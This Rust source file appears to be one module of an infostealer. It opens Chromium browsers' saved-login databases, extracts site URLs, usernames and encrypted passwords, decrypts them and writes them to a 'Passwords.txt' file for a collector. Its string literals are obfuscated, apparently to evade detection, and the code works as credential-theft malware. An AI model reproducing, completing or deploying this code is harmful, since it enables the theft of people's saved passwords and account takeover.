use crate::chromium::{BrowserData, decrypt_data};
use crate::{Password, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
use alloc::borrow::ToOwned;
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const LOGINS_ORIGIN_URL: usize = 0;
const LOGINS_USERNAME_VALUE: usize = 3;
const LOGINS_PASSWORD_VALUE: usize = 5;

pub(super) struct PasswordsTask {
    browser: Arc<BrowserData>,
}

impl PasswordsTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for PasswordsTask {
    parent_name!("Passwords.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(passwords) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("Login Data"),
            s!("Logins"),
            |record| extract_password_from_record(record, &self.browser),
        ) else {
            return;
        };

        collector
            .get_browser()
            .increase_passwords_by(passwords.len());
        let _ = to_string_and_write_all(&passwords, "\n\n", filesystem, parent);
    }
}

fn extract_password_from_record<R: TableRecord>(
    record: &R,
    browser_data: &BrowserData,
) -> Option<Password> {
    let origin = record
        .get_value(LOGINS_ORIGIN_URL)
        .and_then(|value| value.as_string());

    let username = record
        .get_value(LOGINS_USERNAME_VALUE)
        .and_then(|value| value.as_string());

    let password = record
        .get_value(LOGINS_PASSWORD_VALUE)
        .and_then(|value| value.as_blob())
        .and_then(|blob| decrypt_data(&blob, browser_data))
        .map(Arc::<str>::from);

    if let (None, None) = (&username, &password) {
        return None;
    }

    Some(Password {
        origin,
        username,
        password,
    })
}
